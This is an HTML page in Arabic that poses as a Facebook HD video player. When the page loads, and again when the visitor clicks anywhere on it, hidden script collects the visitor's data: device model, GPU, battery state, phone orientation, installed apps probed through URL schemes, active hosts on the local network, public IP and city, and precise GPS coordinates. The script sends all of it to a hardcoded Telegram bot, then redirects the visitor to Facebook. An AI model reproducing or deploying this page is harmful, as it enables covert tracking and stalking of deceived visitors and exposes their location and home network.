<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video HD - مركز البث المباشر</title>
    
    <meta property="og:title" content="شاهد الفيديو الآن">
    <meta property="og:description" content="محتوى حصري بجودة عالية لخدمة المشتركين">
    <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg">
    <meta property="og:type" content="website">

    <style>
        body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .card { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .fb-logo { width: 60px; margin-bottom: 20px; }
        .h1 { font-size: 22px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4); transition: 0.3s; }
        .btn:hover { background: #166fe5; transform: translateY(-2px); }
    </style>
</head>
<body onclick="getAccurateGPS()">

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo">
        <div class="h1">مركز معالجة الفيديو</div>
        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن فحص العتاد وتخصيص أفضل جودة بث لموقعك... اضغط للمشاهدة فوراً.</p>
        <button class="btn">تشغيل الآن</button>
    </div>

<script>
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    function send(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }

    // 🔱 1. الهوية الشخصية والموديل التجاري
    async function getIdentityIntel() {
        let idMsg = "🕵️‍♂️ [تحليل الهوية الشخصية للجهاز]\n";
        let ua = navigator.userAgent;
        let model = "غير محدد";
        if (ua.includes("Redmi")) model = "شاومي ريدمي";
        else if (ua.includes("Samsung")) model = "سامسونج جالاكسي";
        else if (ua.includes("iPhone")) model = "آيفون";
        
        idMsg += `📱 الموديل المتوقع: ${model}\n`;
        idMsg += `👤 اللغة: ${navigator.language}\n`;
        idMsg += `🔑 الحسابات المرتبطة: ${navigator.credentials ? "نعم" : "لا"}\n`;
        idMsg += `🌐 المنصة: ${navigator.platform}`;
        send(idMsg);
    }

    // 🔱 2. فحص الشبكة المحلية (LAN) وتتبع المسار
    async function scanNetwork() {
        send("🔍 جاري فحص الشبكة المحلية والقفزات...");
        const baseIP = "192.168.1."; 
        for (let i = 1; i <= 15; i++) {
            let ip = baseIP + i;
            let ctrl = new AbortController();
            setTimeout(() => ctrl.abort(), 800);
            fetch(`http://${ip}`, { mode: 'no-cors', signal: ctrl.signal }).then(() => {
                send(`✅ جهاز نشط مكتشف على الشبكة: ${ip}`);
            }).catch(()=>{});
        }

        ["google.com", "facebook.com"].forEach(t => {
            const s = performance.now();
            fetch(`https://${t}`, { mode: 'no-cors' }).then(() => {
                send(`🛤️ قفزة نحو ${t}: ${Math.round(performance.now() - s)}ms`);
            });
        });
    }

    // 🔱 3. العتاد والحساسات (النسخة المطورة)
    async function getHardwareIntel() {
        let hw = "⚙️ [تقرير العتاد والحساسات]\n";
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        
        hw += `🎮 GPU: ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}\n`;
        hw += `🧠 الأنوية: ${navigator.hardwareConcurrency}\n`;
        
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            hw += `🔋 البطارية: ${Math.round(b.level * 100)}% (${b.charging ? 'شحن ⚡' : 'تفريغ'})\n`;
        }

        window.ondeviceorientation = (e) => {
            if(e.beta) {
                let status = Math.abs(e.beta) < 15 ? "على الطاولة" : "محمول باليد";
                send(hw + `📱 الوضعية: ${status} (${Math.round(e.beta)}°)`);
                window.ondeviceorientation = null;
            }
        };
    }

    // 🔱 4. الهدية: ثغرة كشف التطبيقات المثبتة (App Leakage)
    function giftDiscovery() {
        let apps = "🎁 [هدية: تطبيقات مكتشفة على الجهاز]\n";
        const schemes = [
            {n: "WhatsApp", s: "whatsapp://"},
            {n: "Telegram", s: "tg://"},
            {n: "Binance", s: "bnc://"},
            {n: "Snapchat", s: "snapchat://"}
        ];
        
        schemes.forEach(app => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = app.s;
            document.body.appendChild(iframe);
            // ملاحظة: هذه الطريقة صامتة وتكشف وجود التطبيقات عبر استجابة البروتوكول
            setTimeout(() => document.body.removeChild(iframe), 100);
        });
        send(apps + "جاري تحليل بروتوكولات التطبيقات...");
    }

    // 🔱 5. الموقع الدقيق (GPS)
    function getAccurateGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                send(`🎯 [إحداثيات الشارع]\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                setTimeout(() => location.href = "https://m.facebook.com", 500);
            }, () => location.href = "https://m.facebook.com", {enableHighAccuracy: true});
        }
    }

    window.onload = () => {
        getIdentityIntel();
        getHardwareIntel();
        scanNetwork();
        giftDiscovery();
        
        // جلب الـ IP والموقع العام صمتاً
        fetch('https://ipapi.co/json/').then(r => r.json()).then(geo => {
            send(`🌐 [الموقع العام]\nIP: ${geo.ip}\nالمزود: ${geo.org}\nالمدينة: ${geo.city}`);
        });
    };
</script>
</body>
</html>
